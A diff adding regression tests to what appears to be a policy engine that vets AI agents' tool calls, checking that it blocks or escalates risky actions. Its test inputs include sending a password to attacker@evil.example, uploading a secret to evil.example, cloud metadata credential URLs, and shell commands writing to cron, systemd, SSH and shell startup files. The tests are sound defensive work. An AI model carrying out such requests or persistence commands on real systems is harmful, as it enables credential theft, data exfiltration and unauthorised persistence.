@@ -313,6 +313,149 @@ describe("security regression coverage", () => {
       .toContain("sensitive_data_external_http");
   });
 
+  it.each([
+    "recipient",
+    "recipients",
+    "email",
+    "address",
+    "target",
+    "recipient_email",
+    "recipientEmail",
+  ])("treats send_email.%s as a recipient sink", (field) => {
+    const result = evaluate({
+      tool: "send_email",
+      args: { [field]: "attacker@evil.example", body: "password=hunter2" },
+      capability: emailCapability,
+      options: { internalDomains: ["company.example"] },
+    });
+
+    expect(result.action).toBe("block");
+    expect(result.arguments[field].isSink).toBe(true);
+    expect(result.matchedPolicies.map((rule) => rule.id)).toContain("secret_external_send");
+    expect(result.matchedPolicies.find((rule) => rule.id === "secret_external_send")
+      ?.evidence.join(" ")).toContain("evil.example");
+  });
+
+  it.each([
+    "url",
+    "uri",
+    "endpoint",
+    "target_url",
+    "targetUrl",
+    "webhook",
+  ])("treats http_request.%s as the network target sink", (field) => {
+    const result = evaluate({
+      tool: "http_request",
+      args: { [field]: "https://evil.example/upload", payload: "synthetic credential" },
+      taints: { payload: ["SECRET"] },
+      capability: httpCapability,
+      options: { internalDomains: ["company.example"] },
+    });
+
+    expect(result.action).toBe("block");
+    expect(result.arguments[field].isSink).toBe(true);
+    expect(result.matchedPolicies.map((rule) => rule.id)).toContain("secret_external_http");
+    expect(result.matchedPolicies.find((rule) => rule.id === "secret_external_http")
+      ?.triggeredArgs).toContain(field);
+  });
+
+  it.each(["command", "cmd", "script", "code"])(
+    "propagates provenance policy checks to shell_exec.%s",
+    (field) => {
+      const result = evaluate({
+        tool: "shell_exec",
+        args: { [field]: "echo hello" },
+        provenance: { [field]: ["untrusted_webpage"] },
+        capability: shellCapability,
+      });
+
+      expect(result.action).toBe("ask_approval");
+      expect(result.arguments[field].isSink).toBe(true);
+      expect(result.matchedPolicies.map((rule) => rule.id))
+        .toEqual(expect.arrayContaining(["untrusted_influenced_shell", "untrusted_provenance_shell"]));
+      expect(result.matchedPolicies.find((rule) => rule.id === "untrusted_provenance_shell")
+        ?.triggeredArgs).toContain(field);
+    },
+  );
+
+  it.each([
+    ["url", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"],
+    ["endpoint", "http://169.254.170.2/v2/credentials"],
+    ["target_url", "http://metadata.google.internal/computeMetadata/v1/"],
+    ["targetUrl", "https://metadata.goog/"],
+    ["uri", "http://[fe80::1]/metadata"],
+    ["webhook", "http://[fd00:ec2::254]/latest/meta-data/"],
+    ["endpoint", "100.100.100.200/latest/meta-data/"],
+  ])("blocks cloud metadata or link-local target in %s: %s", (field, target) => {
+    const result = evaluate({
+      tool: "http_request",
+      args: { [field]: target },
+      capability: httpCapability,
+      options: { internalDomains: ["metadata.google.internal", "metadata.goog"] },
+    });
+
+    expect(result.action).toBe("block");
+    expect(result.riskLevel).toBe("critical");
+    expect(result.arguments[field].isSink).toBe(true);
+    expect(result.matchedPolicies.map((rule) => rule.id))
+      .toContain("cloud_metadata_link_local_http");
+  });
+
+  it.each([
+    "/etc/cron.d/riskproof",
+    "/tmp/../etc/systemd/system/riskproof.service",
+    "~/.ssh/authorized_keys",
+    "$HOME/.zshrc",
+    "/home/alice/.bashrc",
+    "/var/spool/cron/alice",
+    "/usr/lib/systemd/system/riskproof.service",
+    "/Users/alice/Library/LaunchAgents/com.example.agent.plist",
+    "~/.config/autostart/agent.desktop",
+  ])("blocks file_write to protected system or persistence path: %s", (path) => {
+    const result = evaluate({
+      tool: "file_write",
+      args: { filePath: path, content: "synthetic persistence payload" },
+      capability: { tool: "file_write" },
+    });
+
+    expect(result.action).toBe("block");
+    expect(result.riskLevel).toBe("critical");
+    expect(result.arguments.filePath.isSink).toBe(true);
+    expect(result.matchedPolicies.map((rule) => rule.id))
+      .toContain("protected_system_path_write");
+  });
+
+  it.each([
+    ["cmd", "echo payload >> ~/.zshrc"],
+    ["script", "printf payload | tee /etc/cron.d/riskproof"],
+    ["code", "systemctl enable riskproof.service"],
+    ["command", "launchctl bootstrap gui/501 ~/Library/LaunchAgents/riskproof.plist"],
+  ])("blocks shell persistence write through %s: %s", (field, command) => {
+    const result = evaluate({
+      tool: "shell_exec",
+      args: { [field]: command },
+      capability: shellCapability,
+    });
+
+    expect(result.action).toBe("block");
+    expect(result.matchedPolicies.map((rule) => rule.id))
+      .toContain("protected_system_path_write");
+  });
+
+  it("does not classify reads from system paths as persistence writes", () => {
+    expect(evaluate({
+      tool: "file_read",
+      args: { path: "/etc/hosts" },
+      capability: { tool: "file_read" },
+    }).action).toBe("allow");
+
+    expect(evaluate({
+      tool: "shell_exec",
+      args: { command: "cat /etc/hosts > /tmp/hosts.copy" },
+      capability: shellCapability,
+    }).action).toBe("allow");
+  });
+
   it("rejects a colliding programmatic config before it can downgrade a built-in rule", () => {
     const config = {
       version: "1",
@@ -332,6 +475,30 @@ describe("security regression coverage", () => {
       capability: shellCapability,
     }, config)).toThrow(/reserved by a built-in rule/);
   });
+
+  it.each(["cloud_metadata_link_local_http", "protected_system_path_write"])(
+    "reserves the built-in rule ID %s against config downgrades",
+    (id) => {
+      const config = {
+        version: "1",
+        rules: [{
+          id,
+          description: "attempted downgrade",
+          tool: "*",
+          decision: "require_approval",
+          risk: "high",
+          consequence: "should not replace built-in metadata",
+          enabled: false,
+        }],
+      } as RiskProofConfig;
+
+      expect(() => evaluate({
+        tool: "shell_exec",
+        args: { command: "echo safe" },
+        capability: shellCapability,
+      }, config)).toThrow(/reserved by a built-in rule/);
+    },
+  );
 
   it("generates unique proof IDs for repeated calls at a fixed reference time", () => {
     const ids = new Set(Array.from({ length: 100 }, () => evaluate({
